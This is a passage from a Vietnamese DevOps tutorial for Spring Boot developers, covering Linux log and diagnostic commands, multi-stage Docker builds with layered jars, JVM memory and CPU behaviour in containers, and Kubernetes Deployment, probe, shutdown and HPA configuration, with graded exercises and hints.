Trong Linux, socket cũng là file descriptor. "Too many open files" (`java.net.SocketException`/`IOException`) = chạm giới hạn FD — có thể giới hạn quá thấp (mặc định 1024 ở nhiều hệ thống) **hoặc** rò rỉ (stream/socket không đóng). Tăng giới hạn: systemd `LimitNOFILE=65536`, Docker `--ulimit nofile=65536:65536`, `/etc/security/limits.conf` cho session login. Nhưng nếu số FD tăng tuyến tính theo thời gian → đó là leak, tăng limit chỉ trì hoãn.

### 4.4 Xử lý log bằng dòng lệnh

```bash
tail -f app.log                         # theo dõi; tail -F theo dõi cả khi file bị rotate
tail -n 500 app.log | grep -i error
grep -C 5 'OrderNotFound' app.log       # 5 dòng ngữ cảnh trước/sau (stack trace)
grep -c ' 500 ' access.log              # đếm
zgrep 'traceId=abc123' app.log.*.gz     # tìm trong log đã nén

# Top 10 endpoint chậm nhất từ access log định dạng: ... "GET /api/x HTTP/1.1" 200 123 0.532
awk '{print $(NF), $7}' access.log | sort -rn | head -10

# Đếm HTTP status theo phút
awk '{split($4,t,":"); print t[2]":"t[3], $9}' access.log | sort | uniq -c

# Phân phối lỗi theo exception class
grep -oE '[a-zA-Z.]+Exception' app.log | sort | uniq -c | sort -rn | head

# Log JSON có cấu trúc -> jq
jq -r 'select(.level=="ERROR") | [.timestamp, .traceId, .message] | @tsv' app.json.log
jq -s 'group_by(.path) | map({path: .[0].path, p99: (map(.durationMs) | sort | .[(length*0.99|floor)])})' access.json.log

journalctl -u order-service --since "10 min ago" -f      # service chạy bằng systemd
```

> 💡 **Góc nhìn Senior:** Thứ tự chẩn đoán "USE trên host" (Brendan Gregg): với mỗi tài nguyên (CPU, memory, disk, network, FD) kiểm tra **U**tilization, **S**aturation, **E**rrors. 60 giây đầu tiên: `uptime`, `dmesg -T | tail`, `vmstat 1`, `mpstat -P ALL 1`, `pidstat 1`, `iostat -xz 1`, `free -m`, `sar -n DEV 1`, `sar -n TCP,ETCP 1`, `top`. Trong container/K8s, bạn có thể không có các tool này → học `kubectl debug` với ephemeral container chứa tool (xem phần 7).

> ⚠️ **Lỗi thường gặp:** `rm` file log lớn khi process đang ghi → đĩa không được giải phóng (FD vẫn mở); hãy `truncate -s 0 file` hoặc restart/reopen. `kill -9` ngay lập tức → mất thread dump, mất graceful shutdown; hãy lấy `jcmd <pid> Thread.print` và `jcmd <pid> GC.heap_info` trước.

### 🛠 Bài tập phần 4

**Bài 4.1 — Bộ lệnh 60 giây (Cơ bản)**
- Đề bài: Chạy một Spring Boot app, tạo tải bằng `hey`/`ab`/k6. Thực hiện các lệnh ở 4.1–4.3, ghi lại PID, số thread, RSS, số FD, số kết nối established tới DB, load average.
- Tiêu chí: giải thích từng con số (RSS khác `-Xmx` thế nào, vì sao số thread > số request đồng thời).

**Bài 4.2 — Tìm thread ăn CPU & rò FD (Trung bình)**
- Đề bài: Thêm 2 endpoint "lỗi": `/burn` (vòng lặp vô hạn trong một thread) và `/leak` (mở `FileInputStream` không đóng). Dùng `top -H` + `jstack` tìm đúng method của `/burn`; dùng `ls /proc/<PID>/fd | wc -l` và `lsof` chứng minh `/leak` rò FD cho đến khi gặp "Too many open files" (đặt `ulimit -n 256` trước khi chạy app).
- Tiêu chí: ảnh chụp/chép output chứng minh; sửa bằng try-with-resources.

**Bài 4.3 — Phân tích access log (Nâng cao)**
- Đề bài: Sinh 1 triệu dòng access log giả lập (script), có một khoảng 5 phút endpoint `/api/checkout` lỗi 503 tăng vọt. Chỉ dùng `awk`/`sort`/`uniq`/`jq`: tìm khoảng thời gian sự cố, endpoint bị ảnh hưởng, tỷ lệ lỗi theo phút, p95 latency trước/trong sự cố.
- Tiêu chí: các lệnh one-liner được lưu thành script có comment; kết quả khớp với dữ liệu sinh ra.

<details>
<summary>Gợi ý lời giải</summary>

- 4.1: RSS = heap đã commit + metaspace + code cache + thread stacks (mỗi thread ~1MB reserve, commit ít hơn) + direct buffers + GC structures + native libs. Số thread gồm Tomcat worker (mặc định max 200), GC thread, JIT compiler thread, Hikari housekeeper, scheduler…
- 4.2: `jstack <pid> | grep -A 15 'nid=0x<hex>'` sẽ thấy `BurnController.burn` ở đỉnh stack, trạng thái `RUNNABLE`.
- 4.3: percentile bằng awk: lọc dòng theo phút, lấy cột latency, `sort -n`, rồi `awk '{a[NR]=$1} END {print a[int(NR*0.95)]}'`.

</details>

---

<a id="p5"></a>
## 5. Docker cho ứng dụng Spring Boot

### 5.1 Image, layer, build cache
- **Image** = chồng các **layer** chỉ đọc (union filesystem, overlay2) + metadata (ENTRYPOINT, ENV, USER…). Mỗi lệnh `RUN`, `COPY`, `ADD` tạo một layer. **Container** = image + một layer ghi được ở trên cùng.
- Layer được định danh theo nội dung (digest) → chia sẻ giữa các image, chỉ pull/push layer thay đổi.
- **Build cache:** Docker tái sử dụng layer nếu lệnh và input không đổi. Khi một layer thay đổi, **mọi layer sau nó bị build lại**. → Đặt thứ **ít thay đổi lên trước** (base image, dependency), **hay thay đổi xuống sau** (code ứng dụng).
- Xóa file ở layer sau **không** làm image nhỏ đi (file vẫn nằm ở layer trước) → dọn dẹp trong cùng một `RUN`, hoặc dùng multi-stage.

Fat jar Spring Boot (~80MB, trong đó ~95% là dependency) copy nguyên vào một layer → mỗi lần sửa 1 dòng code, push lại 80MB. Giải pháp: **layered jar**.

### 5.2 Multi-stage build với layered jar

```dockerfile
# syntax=docker/dockerfile:1.7
############ Stage 1: build ############
FROM eclipse-temurin:21-jdk AS build
WORKDIR /src
# 1) Chỉ copy file build trước -> cache dependency khi code đổi
COPY mvnw pom.xml ./
COPY .mvn .mvn
RUN --mount=type=cache,target=/root/.m2 ./mvnw -B -q dependency:go-offline
# 2) Copy source và build
COPY src src
RUN --mount=type=cache,target=/root/.m2 ./mvnw -B -q package -DskipTests \
 && cp target/*.jar application.jar
# 3) Tách jar thành các layer (Spring Boot 3.3+: jarmode "tools")
RUN java -Djarmode=tools -jar application.jar extract --layers --destination extracted

############ Stage 2: runtime ############
FROM eclipse-temurin:21-jre
RUN groupadd --system app && useradd --system --gid app --no-create-home app
WORKDIR /app
# Thứ tự: ít thay đổi -> hay thay đổi
COPY --from=build /src/extracted/dependencies/ ./
COPY --from=build /src/extracted/spring-boot-loader/ ./
COPY --from=build /src/extracted/snapshot-dependencies/ ./
COPY --from=build /src/extracted/application/ ./
USER app
EXPOSE 8080
ENV JAVA_TOOL_OPTIONS="-XX:MaxRAMPercentage=75 -XX:+ExitOnOutOfMemoryError"
ENTRYPOINT ["java", "-jar", "application.jar"]
```

Giải thích:
- Image runtime **không chứa** JDK, Maven, source code → nhỏ hơn, ít bề mặt tấn công.
- `-DskipTests` ở đây vì test đã chạy ở stage CI trước đó (build once). Nếu Dockerfile là nơi build duy nhất, chạy test trong stage build.
- `--mount=type=cache` (BuildKit) giữ `~/.m2` giữa các lần build mà không đưa vào image.
- Bốn layer của Spring Boot: `dependencies` (release), `spring-boot-loader`, `snapshot-dependencies`, `application` (class + resource của bạn). Sửa code → chỉ layer `application` (vài trăm KB) đổi.
- Với Boot < 3.3: dùng `-Djarmode=layertools -jar app.jar extract` và `ENTRYPOINT ["java", "org.springframework.boot.loader.launch.JarLauncher"]` (Boot 3.2+; Boot 2.x/3.0–3.1 là `org.springframework.boot.loader.JarLauncher`).
- Bố cục extract mới (`application.jar` + `lib/`) cũng thuận tiện cho **CDS** (Class Data Sharing) để giảm thời gian khởi động: chạy training run với `-XX:ArchiveClassesAtExit=app.jsa -Dspring.context.exit=onRefresh`, rồi chạy thật với `-XX:SharedArchiveFile=app.jsa`.

### 5.3 Các cách build image khác
- **Cloud Native Buildpacks:** `./mvnw spring-boot:build-image -Dspring-boot.build-image.imageName=acme/order:1.4.0` — không cần Dockerfile, tự layered, tự cấu hình memory calculator cho JVM, image chạy non-root.
- **Jib** (Google): `./mvnw compile jib:build -Dimage=registry/acme/order:1.4.0` — build và push **không cần Docker daemon**, tự tách layer (dependencies, resources, classes), reproducible (timestamp cố định). Phù hợp CI không có Docker.
- **Distroless** (`gcr.io/distroless/java21-debian12:nonroot`): chỉ chứa JRE + thư viện tối thiểu, **không có shell, package manager** → ít CVE, nhưng không `docker exec sh` được; debug bằng ephemeral container (`kubectl debug`). Alpine (musl libc) cũng nhỏ nhưng từng có khác biệt hành vi với glibc (DNS, hiệu năng) — cân nhắc kỹ, dùng bản JRE build riêng cho musl.
- **jlink** tạo JRE tùy biến chỉ chứa module cần (`jdeps --print-module-deps` để tìm module) → runtime nhỏ hơn.

### 5.4 Best practices (và vì sao)

| Thực hành | Lý do |
|---|---|
| Ghim tag cụ thể, tốt nhất ghim **digest** (`eclipse-temurin:21.0.4_7-jre@sha256:...`) | `latest` đổi bất cứ lúc nào → build không lặp lại được |
| Chạy **non-root** (`USER`) | Thoát container ít nguy hiểm hơn; nhiều cluster cấm root (Pod Security Standards "restricted") |
| `ENTRYPOINT` dạng **exec** (`["java", ...]`) | Dạng shell (`ENTRYPOINT java -jar app.jar`) chạy qua `/bin/sh -c` → `sh` là PID 1, **không chuyển SIGTERM** cho Java → không graceful shutdown, bị SIGKILL sau grace period |
| `.dockerignore` (target/, .git/, *.log, .env) | Build context nhỏ, không lộ secret, cache không bị vô hiệu bởi file rác |
| Không đưa secret vào image (`ENV PASSWORD=`, `COPY .env`) | Ai pull image cũng đọc được qua `docker history`/layer. Dùng `RUN --mount=type=secret` khi build cần token |
| Một process mỗi container, log ra stdout/stderr | Runtime/K8s thu log, restart policy hoạt động đúng |
| `HEALTHCHECK` (khi chạy Docker/Compose thuần) | K8s dùng probe riêng, bỏ qua `HEALTHCHECK` |
| Quét image (Trivy, Grype, Docker Scout) trong CI | Base image cũ chứa CVE của OS packages |
| Label OCI (`org.opencontainers.image.source`, `revision`) | Truy vết image về commit |

### 5.5 docker-compose cho môi trường dev local

```yaml
# compose.yaml
services:
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: shop
      POSTGRES_USER: shop
      POSTGRES_PASSWORD: shop        # chỉ cho local
    ports: ["5432:5432"]
    volumes: ["pgdata:/var/lib/postgresql/data"]
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U shop -d shop"]
      interval: 5s
      retries: 10

  redis:
    image: redis:7-alpine
    ports: ["6379:6379"]

  kafka:
    image: apache/kafka:3.8.0       # KRaft mode, không cần ZooKeeper
    ports: ["9092:9092"]

  app:
    build: .
    depends_on:
      postgres: { condition: service_healthy }    # chờ healthy, không chỉ "started"
      redis: { condition: service_started }
    environment:
      SPRING_DATASOURCE_URL: jdbc:postgresql://postgres:5432/shop    # tên service = DNS trong network của compose
      SPRING_DATASOURCE_USERNAME: shop
      SPRING_DATASOURCE_PASSWORD: shop
      SPRING_DATA_REDIS_HOST: redis
    ports: ["8080:8080"]
    deploy:
      resources:
        limits: { memory: 768m, cpus: "1.0" }   # mô phỏng limit production

volumes:
  pgdata:
```
- Trong container, `localhost` là **chính container đó** → kết nối DB bằng tên service (`postgres`), không phải `localhost`.
- Spring Boot 3.1+ có `spring-boot-docker-compose`: khi chạy app từ IDE, Boot tự `docker compose up` file `compose.yaml` và tạo connection details tương ứng — không cần cấu hình URL bằng tay.
- `depends_on` chỉ quản lý thứ tự khởi động; app vẫn phải **tự chịu được** dependency chưa sẵn sàng (retry kết nối) — điều này cũng đúng trên K8s.

> ⚠️ **Lỗi thường gặp:**
> - `COPY . .` trước `RUN mvn dependency:go-offline` → mỗi lần sửa code tải lại toàn bộ dependency.
> - Image 600MB vì dùng JDK + Maven làm runtime.
> - Port mapping `"5432:5432"` trùng với Postgres cài trên máy → lỗi bind.
> - Dùng `docker-compose` cho production "vì nó chạy được" — thiếu scheduling, self-healing, rolling update.

### 🛠 Bài tập phần 5

**Bài 5.1 — Từ Dockerfile ngây thơ đến tối ưu (Cơ bản)**
- Đề bài: Viết Dockerfile ngây thơ (`FROM maven:3-eclipse-temurin-21`, `COPY . .`, `RUN mvn package`, `CMD mvn spring-boot:run`). Sau đó viết bản multi-stage + layered như 5.2.
- Tiêu chí: so sánh kích thước image (`docker images`), thời gian rebuild khi sửa 1 dòng code, kích thước layer phải push (`docker history`). Image cuối < 300MB, chạy non-root (`docker exec <id> id` không ra uid 0).

**Bài 5.2 — Graceful shutdown và PID 1 (Trung bình)**
- Đề bài: Tạo endpoint xử lý 10s. Build 2 image: một với `ENTRYPOINT java -jar app.jar` (shell form), một với exec form. Gửi request rồi `docker stop` (mặc định timeout 10s, có thể chỉnh `-t 30`). Quan sát log shutdown và request đang xử lý.
- Tiêu chí: giải thích vì sao bản shell form bị kill sau timeout mà không có log "Commencing graceful shutdown"; exit code mỗi bản (143 = SIGTERM, 137 = SIGKILL).

**Bài 5.3 — Jib vs Buildpacks vs Dockerfile + scan (Nâng cao)**
- Đề bài: Build cùng một app bằng 3 cách (Dockerfile 5.2, Jib với base distroless, `spring-boot:build-image`). Quét cả 3 bằng Trivy (`trivy image --severity HIGH,CRITICAL`). Đo thời gian khởi động (log "Started ... in X seconds") và RSS.
- Tiêu chí: bảng so sánh kích thước, số CVE, thời gian build, khởi động, khả năng debug; khuyến nghị có lập luận cho team.

<details>
<summary>Gợi ý lời giải</summary>

- 5.1: `docker history --no-trunc <image>` cho thấy kích thước từng layer. Bản tối ưu: sửa code chỉ đổi layer `application`.
- 5.2: shell form: PID 1 là `/bin/sh`, `sh` không forward SIGTERM → Java không biết phải tắt → Docker gửi SIGKILL sau timeout → exit 137. Có thể chạy `docker run --init` (tini) để có init process forward signal, nhưng exec form là cách đúng.
- 5.3: Jib cấu hình:
```xml
<plugin>
  <groupId>com.google.cloud.tools</groupId>
  <artifactId>jib-maven-plugin</artifactId>
  <version>3.4.4</version>
  <configuration>
    <from><image>gcr.io/distroless/java21-debian12:nonroot</image></from>
    <to><image>registry.local/acme/order</image><tags><tag>${project.version}</tag></tags></to>
    <container><jvmFlags><jvmFlag>-XX:MaxRAMPercentage=75</jvmFlag></jvmFlags></container>
  </configuration>
</plugin>
```

</details>

---

<a id="p6"></a>
## 6. JVM trong container

### 6.1 Container nhìn từ góc độ kernel
Container không phải VM: là process bình thường trên host, được cô lập bằng **namespaces** (pid, net, mnt, uts, ipc, user) và bị giới hạn tài nguyên bằng **cgroups** (v1 hoặc v2): memory limit, CPU quota/shares, pids. Các tool cũ (`free`, `top`, `/proc/meminfo`) trong container thường hiển thị **tài nguyên của host**.

JVM đời cũ (trước JDK 8u191/JDK 10) đọc `/proc/meminfo` và số CPU của host → container 1GB trên host 64GB: JVM chọn max heap = 16GB (1/4 RAM host) → vượt limit → kernel **OOM-kill** container (exit code 137, `OOMKilled: true`), không có `OutOfMemoryError`, không có heap dump.

### 6.2 Container support hiện đại
- `-XX:+UseContainerSupport` mặc định bật (JDK 10+, backport 8u191+): JVM đọc limit từ cgroup. Hỗ trợ **cgroup v2** từ JDK 15 (backport 11.0.16, 8u372) — JDK quá cũ trên node cgroup v2 sẽ không nhận đúng limit.
- Kiểm tra JVM thấy gì:
```bash
docker run --rm -m 1g --cpus 2 eclipse-temurin:21-jre \
  java -XX:+PrintFlagsFinal -version | grep -E 'MaxHeapSize|UseSerialGC|UseG1GC|ActiveProcessorCount'
docker run --rm -m 1g eclipse-temurin:21-jre java -Xlog:os+container=trace -version
```

### 6.3 Bộ nhớ: heap chỉ là một phần
```
Container memory limit (vd 1 GiB)
├── Java heap (-Xmx hoặc MaxRAMPercentage)
├── Metaspace (class metadata — không giới hạn mặc định!)
├── Code cache (JIT, mặc định reserve 240MB)
├── Thread stacks (Xss ~1MB/thread reserve; 200 Tomcat thread...)
├── Direct/NIO buffers (Netty, Kafka client; mặc định MaxDirectMemorySize ≈ max heap)
├── GC data structures (G1 remembered sets, card table)
├── Symbol/String table, JNI, malloc arenas của glibc
└── Non-JVM: file khác trong container (tmpfs /tmp tính vào memory cgroup!)
```
- Mặc định `MaxRAMPercentage=25` → heap chỉ 25% limit, lãng phí. Thường đặt **`-XX:MaxRAMPercentage=70..80`** và để phần còn lại cho non-heap. Với container rất nhỏ (< 512MB) cần tính toán kỹ hơn hoặc đặt `-Xmx` tường minh.
- Đặt `-Xms` = `-Xmx` (hoặc `InitialRAMPercentage` = `MaxRAMPercentage`) trên K8s → heap commit sớm, tránh bất ngờ khi tải tăng; đánh đổi: dùng RAM ngay từ đầu.
- Giới hạn các vùng khác khi cần: `-XX:MaxMetaspaceSize=256m`, `-XX:ReservedCodeCacheSize=128m`, `-XX:MaxDirectMemorySize=256m`, `-Xss512k` (cẩn thận StackOverflow với đệ quy sâu).
- Chẩn đoán RSS: `-XX:NativeMemoryTracking=summary` rồi `jcmd <pid> VM.native_memory summary`.
- Luôn bật: `-XX:+ExitOnOutOfMemoryError` (để orchestrator restart thay vì JVM "nửa sống nửa chết"), `-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dumps` (mount volume, nếu không dump mất khi container chết).

**Phân biệt hai loại OOM:**
| | `java.lang.OutOfMemoryError: Java heap space` | Container `OOMKilled` (exit 137) |
|---|---|---|
| Ai phát hiện | JVM | Kernel (cgroup OOM killer) |
| Nguyên nhân | Heap đầy (leak, dữ liệu lớn) | **Tổng** bộ nhớ process vượt limit (thường do non-heap hoặc heap đặt quá sát limit) |
| Dấu vết | Exception, heap dump | `kubectl describe pod` → `Last State: Terminated, Reason: OOMKilled`; không có log Java |

### 6.4 CPU: số core, GC ergonomics và throttling
- JVM tính `availableProcessors()` từ **CPU limit** (quota/period, làm tròn lên). Từ JDK 19 (và các bản backport gần đây) JVM **không còn** dùng CPU shares (requests) để tính số CPU. Nếu không đặt CPU limit → JVM thấy **toàn bộ CPU của node** (vd 64) → tạo 64 GC thread, ForkJoinPool common pool 63 thread, Netty event loop 128 thread… trong một pod chỉ được request 1 CPU.
- Ghi đè: `-XX:ActiveProcessorCount=2`.
- **GC ergonomics:** JVM chỉ coi máy là "server class" khi có **≥ 2 CPU và ≥ ~1792MB RAM**; nếu không, mặc định dùng **SerialGC** (một thread, stop-the-world). Container 1 CPU/1GB → SerialGC âm thầm. Đặt tường minh `-XX:+UseG1GC` (hoặc ZGC cho latency thấp với heap lớn) và cấp ≥ 2 CPU nếu cần GC song song.
- **CPU throttling (CFS quota):** limit `1 CPU` = 100ms CPU time mỗi chu kỳ 100ms, **cộng dồn trên mọi thread**. Một GC song song 8 thread có thể tiêu hết 100ms quota trong 12.5ms wall-clock → process bị **dừng hẳn** ~87.5ms còn lại → p99 latency tăng vọt dù "CPU usage trung bình chỉ 40%". Dấu hiệu: metric `container_cpu_cfs_throttled_periods_total` / `container_cpu_cfs_throttled_seconds_total` tăng.
- Khởi động JVM (class loading, JIT C1/C2) tốn nhiều CPU: với limit thấp, startup chậm gấp nhiều lần → startup probe fail → restart loop.

> 💡 **Góc nhìn Senior — cấu hình khởi điểm cho service Spring Boot trên K8s:**
> - `resources.requests.memory = limits.memory` (vd 1Gi), `-XX:MaxRAMPercentage=75`.
> - CPU: `requests` theo nhu cầu thực đo được; **limit cao hơn request** (vd request 500m, limit 2) hoặc không đặt limit CPU (nhiều tổ chức chọn cách này để tránh throttling), kết hợp `-XX:ActiveProcessorCount` khớp với kích thước thật.
> - `-XX:+UseG1GC -XX:+ExitOnOutOfMemoryError`; giảm thời gian khởi động bằng CDS/AppCDS, Spring AOT, hoặc cân nhắc GraalVM native image / CRaC khi startup là vấn đề (scale-to-zero, serverless).
> - Theo dõi: heap sau GC, GC pause, RSS vs limit, throttled time, restart count.

> ⚠️ **Lỗi thường gặp:** đặt `-Xmx` bằng đúng memory limit → OOMKilled; base image JDK 8 cũ trên node cgroup v2; không đặt CPU limit mà cũng không đặt `ActiveProcessorCount` → hàng trăm thread; tin `top` trong container.

### 🛠 Bài tập phần 6

**Bài 6.1 — JVM thấy gì? (Cơ bản)**
- Đề bài: Chạy `java -XX:+PrintFlagsFinal -version` trong container với các tổ hợp `-m 256m/1g/4g`, `--cpus 1/2/4`. Ghi lại `MaxHeapSize`, GC được chọn, `ActiveProcessorCount`.
- Tiêu chí: bảng kết quả; chỉ ra tổ hợp nào JVM chọn SerialGC và vì sao.

**Bài 6.2 — Tái hiện OOMKilled vs OutOfMemoryError (Trung bình)**
- Đề bài: App có endpoint cấp phát (a) heap (`byte[]` giữ trong list), (b) direct memory (`ByteBuffer.allocateDirect`). Chạy với `-m 512m` và `-Xmx400m`. Gọi từng endpoint đến khi chết; quan sát exit code, log, `docker inspect --format '{{.State.OOMKilled}}'`.
- Tiêu chí: giải thích vì sao (b) có thể bị OOMKilled không có exception; sửa cấu hình (`MaxRAMPercentage`, `MaxDirectMemorySize`) để JVM báo lỗi có kiểm soát.

**Bài 6.3 — Đo CPU throttling (Nâng cao)**
- Đề bài: Chạy app với `--cpus 1` và tải đều (k6 open model). So sánh p99 khi dùng `-XX:+UseParallelGC` với 8 GC thread (`-XX:ParallelGCThreads=8`) vs `-XX:ParallelGCThreads=1`/G1 mặc định. Đọc `cpu.stat` trong cgroup (`/sys/fs/cgroup/cpu.stat`: `nr_throttled`, `throttled_usec`).
- Tiêu chí: bảng p99 và số throttled periods; giải thích bằng cơ chế CFS quota.

<details>
<summary>Gợi ý lời giải</summary>

- 6.1: với `--cpus 1` hoặc `-m` < ~1792m → `UseSerialGC = true`.
- 6.2: direct memory nằm ngoài heap; nếu `MaxDirectMemorySize` mặc định ≈ `Xmx` (400m) thì heap + direct có thể lên 800m > 512m limit → kernel kill trước khi JVM kịp ném `OutOfMemoryError: Cannot reserve direct buffer memory`. Đặt `-XX:MaxDirectMemorySize=64m` → JVM ném exception có kiểm soát.
- 6.3: `docker exec <id> cat /sys/fs/cgroup/cpu.stat` (cgroup v2). Nhiều GC thread song song đốt quota nhanh → `nr_throttled` tăng, p99 tăng.

</details>

---

<a id="p7"></a>
## 7. Kubernetes cho developer

### 7.1 Các object cốt lõi
- **Pod:** đơn vị deploy nhỏ nhất; 1+ container chia sẻ network namespace (cùng IP, gọi nhau qua `localhost`) và volume. Pod là **ephemeral** — chết là mất, IP mới khi tạo lại.
- **Deployment → ReplicaSet → Pod:** khai báo trạng thái mong muốn (image, số replica); controller liên tục điều chỉnh thực tế về mong muốn (reconciliation loop). Rolling update tạo ReplicaSet mới.
- **Service:** IP ảo ổn định + DNS (`order-service.shop.svc.cluster.local`) load-balance tới các Pod **Ready** khớp selector. Kiểu: `ClusterIP` (nội bộ, mặc định), `NodePort`, `LoadBalancer`, headless (`clusterIP: None` → DNS trả IP từng pod, dùng cho StatefulSet).
- **Ingress / Gateway API:** định tuyến HTTP(S) từ ngoài vào Service theo host/path, TLS termination; cần một controller (NGINX, Traefik, HAProxy, cloud LB…). Gateway API là thế hệ kế tiếp của Ingress, giàu tính năng hơn (traffic splitting, header matching) — dự án ingress-nginx cộng đồng đã thông báo ngừng bảo trì, các nền tảng mới nên ưu tiên Gateway API.
- **ConfigMap / Secret:** cấu hình và dữ liệu nhạy cảm, mount dạng env hoặc file. **Secret chỉ là base64, không phải mã hóa** — cần bật encryption at rest cho etcd, RBAC chặt, hoặc dùng External Secrets Operator / Vault / CSI Secret Store.
- Khác: **StatefulSet** (DB, Kafka — danh tính ổn định), **Job/CronJob** (batch), **HPA**, **PodDisruptionBudget**, **NetworkPolicy**.

### 7.2 Manifest đầy đủ cho một Spring Boot service

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: order-service
  labels: { app: order-service }
spec:
  replicas: 3
  revisionHistoryLimit: 5
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1            # tạo thêm tối đa 1 pod mới trước
      maxUnavailable: 0      # không giảm capacity trong khi update
  selector:
    matchLabels: { app: order-service }
  template:
    metadata:
      labels: { app: order-service }
    spec:
      terminationGracePeriodSeconds: 45
      securityContext:
        runAsNonRoot: true
        seccompProfile: { type: RuntimeDefault }
      containers:
        - name: app
          image: registry.acme.com/shop/order-service:1.4.0@sha256:4f1c...   # ghim digest
          ports:
            - { name: http, containerPort: 8080 }
            - { name: mgmt, containerPort: 8081 }
          env:
            - name: SPRING_PROFILES_ACTIVE
              value: prod
            - name: JAVA_TOOL_OPTIONS
              value: "-XX:MaxRAMPercentage=75 -XX:+UseG1GC -XX:+ExitOnOutOfMemoryError -XX:ActiveProcessorCount=2"
            - name: SPRING_DATASOURCE_PASSWORD
              valueFrom: { secretKeyRef: { name: order-db, key: password } }
          envFrom:
            - configMapRef: { name: order-config }
          resources:
            requests: { cpu: "500m", memory: "1Gi" }
            limits:   { cpu: "2",    memory: "1Gi" }
          startupProbe:
            httpGet: { path: /actuator/health/liveness, port: mgmt }
            periodSeconds: 5
            failureThreshold: 30        # cho tối đa 150s để khởi động
          livenessProbe:
            httpGet: { path: /actuator/health/liveness, port: mgmt }
            periodSeconds: 10
            failureThreshold: 3
          readinessProbe:
            httpGet: { path: /actuator/health/readiness, port: mgmt }
            periodSeconds: 5
            failureThreshold: 2
          lifecycle:
            preStop:
              exec: { command: ["sh", "-c", "sleep 10"] }   # image distroless không có sh -> dùng lifecycle sleep action (K8s 1.30+)
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
          volumeMounts:
            - { name: tmp, mountPath: /tmp }      # Tomcat cần thư mục tạm ghi được
      volumes:
        - name: tmp
          emptyDir: {}
---
apiVersion: v1
kind: Service
metadata: { name: order-service }
spec:
  selector: { app: order-service }
  ports: [{ name: http, port: 80, targetPort: http }]
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata: { name: order-service }
spec:
  minAvailable: 2
  selector: { matchLabels: { app: order-service } }
```

Cấu hình Spring Boot tương ứng:
```yaml
# application-prod.yml
server:
  shutdown: graceful                 # mặc định từ Boot 3.4, khai báo tường minh cho rõ
spring:
  lifecycle:
    timeout-per-shutdown-phase: 25s  # < terminationGracePeriodSeconds - preStop
management:
  server:
    port: 8081                       # tách cổng management khỏi traffic chính
  endpoint:
    health:
      probes:
        enabled: true                # tự bật khi phát hiện chạy trên K8s
      group:
        readiness:
          include: readinessState, db   # cân nhắc kỹ, xem 7.3
  endpoints:
    web:
      exposure:
        include: health, info, prometheus
```

### 7.3 Probes — thiết kế đúng
| Probe | Câu hỏi | Khi fail | Nên kiểm tra |
|---|---|---|---|
| **startup** | Đã khởi động xong chưa? | Kill & restart (sau threshold) | Giống liveness; trong lúc startup probe chưa pass, liveness/readiness bị tạm hoãn |
| **liveness** | Process có bị kẹt không thể tự phục hồi? | **Restart container** | Chỉ trạng thái nội bộ (`LivenessState`, deadlock). **Không** kiểm tra DB/service ngoài |
| **readiness** | Có sẵn sàng nhận traffic? | Gỡ khỏi Service endpoints (không restart) | Đã warm-up, không đang shutdown; dependency thiết yếu (cân nhắc) |

Spring Boot Actuator cung cấp `ApplicationAvailability` với `LivenessState` (`CORRECT`/`BROKEN`) và `ReadinessState` (`ACCEPTING_TRAFFIC`/`REFUSING_TRAFFIC`). Khi shutdown bắt đầu, Boot chuyển readiness sang `REFUSING_TRAFFIC`. Bạn có thể tự publish: `AvailabilityChangeEvent.publish(ctx, ReadinessState.REFUSING_TRAFFIC)` (vd khi cache warm-up chưa xong).

> 💡 **Góc nhìn Senior — sai lầm kinh điển:** đưa DB vào liveness. DB chậm 30s → mọi pod fail liveness → K8s restart **tất cả** pod cùng lúc → khi DB hồi phục, toàn bộ pod đang khởi động lại (thundering herd, cache lạnh) → sự cố kéo dài gấp nhiều lần. Đưa DB vào readiness cũng cần cân nhắc: DB down → mọi pod unready → Service không còn endpoint → client nhận lỗi kết nối thay vì một response 503 có ý nghĩa. Nhiều team chỉ để readiness phản ánh trạng thái nội bộ và xử lý lỗi dependency bằng circuit breaker.

### 7.4 Graceful shutdown & preStop
Trình tự khi pod bị xóa (rolling update, scale down, node drain):
1. Pod chuyển `Terminating`. **Song song:** (a) kubelet chạy `preStop` hook rồi gửi SIGTERM; (b) endpoint controller gỡ pod khỏi EndpointSlice → kube-proxy/ingress controller trên mọi node cập nhật quy tắc (mất vài trăm ms đến vài giây).
2. Nếu app nhận SIGTERM và đóng ngay trong khi (b) chưa lan truyền xong → request mới vẫn được route tới pod đang tắt → **connection refused / 502**.
3. `preStop: sleep 10` trì hoãn SIGTERM, cho (b) thời gian lan truyền.
4. SIGTERM → Spring graceful shutdown: readiness chuyển REFUSING, web server ngừng nhận request mới, chờ request đang xử lý (tối đa `timeout-per-shutdown-phase`), đóng các bean (Kafka consumer commit offset, đóng pool).
5. Hết `terminationGracePeriodSeconds` (tính **từ đầu**, bao gồm cả preStop) → SIGKILL.

Ràng buộc: `preStop sleep + timeout-per-shutdown-phase + dự phòng < terminationGracePeriodSeconds`. Ví dụ: 10 + 25 + 10 = 45.

### 7.5 Resources, QoS và HPA
- **requests**: dùng cho **scheduling** (scheduler đặt pod vào node còn đủ request) và tỷ lệ chia CPU khi tranh chấp.
- **limits**: memory → vượt là OOMKilled; CPU → bị throttle (không bị kill).
- **QoS class:** `Guaranteed` (request = limit cho cả CPU và memory mọi container), `Burstable`, `BestEffort` (không đặt gì — bị evict đầu tiên khi node thiếu bộ nhớ).

```yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata: { name: order-service }
spec:
  scaleTargetRef: { apiVersion: apps/v1, kind: Deployment, name: order-service }
  minReplicas: 3
  maxReplicas: 20
  metrics:
    - type: Resource
      resource:
        name: cpu
        target: { type: Utilization, averageUtilization: 65 }   # % so với REQUEST, không phải limit
  behavior:
    scaleDown:
      stabilizationWindowSeconds: 300      # tránh dao động
      policies: [{ type: Percent, value: 50, periodSeconds: 60 }]
```
